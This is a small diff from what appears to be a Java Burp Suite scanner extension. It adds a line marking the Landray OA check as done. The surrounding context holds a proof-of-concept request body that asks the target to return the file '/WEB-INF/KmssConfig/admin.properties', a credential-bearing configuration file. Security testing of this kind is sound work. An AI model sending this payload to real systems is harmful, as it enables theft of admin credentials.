@@ -30,6 +30,7 @@ public class LandrayOa extends VulTaskImpl {
         String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
         //新请求
         okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
+        BurpExtender.vulsChecked.add("burp.vuls.LandrayOa" + host + iHttpService.getPort()); //添加检测标记
     }
 }
 
